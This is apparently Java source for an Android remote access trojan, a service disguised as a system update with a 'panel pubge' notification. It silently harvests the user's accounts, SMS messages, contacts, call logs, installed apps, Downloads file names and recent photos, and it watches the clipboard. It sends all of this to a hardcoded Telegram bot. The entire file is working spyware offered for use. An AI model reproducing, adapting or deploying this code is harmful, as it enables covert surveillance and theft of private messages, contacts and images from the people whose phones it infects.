package com.system.update;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.*;
import android.content.*;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import java.io.*;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;
import okhttp3.*;

public class RatService extends Service {
    // ⚠️ غير البيانات هنا
    private static final String BOT_TOKEN = "9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
    private static final String CHAT_ID = "6978974735";
    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";

    private OkHttpClient client = new OkHttpClient();
    private String lastClipboard = "";
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        
        new Thread(() -> {
            try {
                sendTextToTelegram("🔄 **الأداة اشتغلت! جاري سحب البيانات...**");
                
                dumpAllAccounts(); Thread.sleep(1000);
                String info = "📱 **Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
                sendTextToTelegram(info); Thread.sleep(1000);

                dumpSms(); Thread.sleep(1500);
                dumpContacts(); Thread.sleep(1500);
                dumpCallLogs(); Thread.sleep(1500);
                dumpApps(); Thread.sleep(1500);
                dumpFiles(); Thread.sleep(1500);
                dumpImages();

                sendTextToTelegram("✅ **اكتمل سحب البيانات والصور!**");
                
                startClipboardMonitor();
            } catch (Exception e) {
                sendTextToTelegram("❌ خطأ: " + e.getMessage());
            }
        }).start();
    }

    private void startForegroundService() {
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, channelId).setContentTitle("panel pubge").setSmallIcon(android.R.drawable.ic_menu_manage).build();
            startForeground(1, notification);
        }
    }

    private void dumpSms() {
        File file = new File(getExternalFilesDir(null), "sms_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null && c.moveToFirst()) {
                do {
                    bw.write("From: " + c.getString(c.getColumnIndexOrThrow("address")) + "\n" + c.getString(c.getColumnIndexOrThrow("body")) + "\n-------------------\n");
                } while (c.moveToNext());
                c.close();
            } else {
                bw.write("لا توجد رسائل أو تم رفض الصلاحية.");
            }
            bw.flush(); 
            uploadFileToTelegram(file, "text/plain");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل سحب الرسائل: " + e.getMessage());
        }
    }

    private void dumpImages() {
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        File[] allImages = new File[0];
        if (dcim.exists() && dcim.listFiles() != null) allImages = dcim.listFiles();
        if (allImages.length > 0) {
            Arrays.sort(allImages, new Comparator<File>() {
                public int compare(File f1, File f2) { return Long.compare(f2.lastModified(), f1.lastModified()); }
            });
            int count = 0;
            for (File img : allImages) {
                if (img.isFile() && (img.getName().endsWith(".jpg") || img.getName().endsWith(".png"))) {
                    if (img.length() < 10 * 1024 * 1024) { 
                        uploadFileToTelegram(img, "image/jpeg"); 
                        count++; 
                        try { Thread.sleep(2000); } catch (Exception e) {} 
                    }
                    if (count >= 5) break;
                }
            }
        }
    }

    private void dumpAllAccounts() {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccounts();
            StringBuilder sb = new StringBuilder("📧 **الحسابات المسجلة:**\n");
            for (Account account : accounts) sb.append("- ").append(account.type).append(": `").append(account.name).append("`\n");
            sendTextToTelegram(sb.toString());
        } catch (Exception e) {}
    }

    private void startClipboardMonitor() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                        ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                        String text = item.getText() != null ? item.getText().toString() : "";
                        if (!text.isEmpty() && !text.equals(lastClipboard)) {
                            lastClipboard = text;
                            sendTextToTelegram("📋 **Clipboard:**\n`" + text + "`");
                        }
                    }
                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void dumpContacts() {
        File file = new File(getExternalFilesDir(null), "contacts_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) { while (c.moveToNext()) bw.write(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + " : " + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n"); c.close(); }
            bw.flush(); uploadFileToTelegram(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpCallLogs() {
        File file = new File(getExternalFilesDir(null), "calls_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) { while (c.moveToNext()) bw.write("Number: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) + "\n"); c.close(); }
            bw.flush(); uploadFileToTelegram(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpApps() {
        File file = new File(getExternalFilesDir(null), "apps.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
            for (ApplicationInfo app : apps) bw.write(app.packageName + "\n");
            bw.flush(); uploadFileToTelegram(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpFiles() {
        File file = new File(getExternalFilesDir(null), "files.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            bw.write("=== Downloads ===\n");
            if (download.exists() && download.listFiles() != null) for (File f : download.listFiles()) bw.write(f.getName() + "\n");
            bw.flush(); uploadFileToTelegram(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void sendTextToTelegram(String text) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
        Request request = new Request.Builder().url(TG_API + "sendMessage").post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void uploadFileToTelegram(File file, String mimeType) {
        if (!file.exists()) return;
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)))
                .build();
        Request request = new Request.Builder().url(TG_API + "sendDocument").post(requestBody).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { isRunning = false; super.onDestroy(); }
}
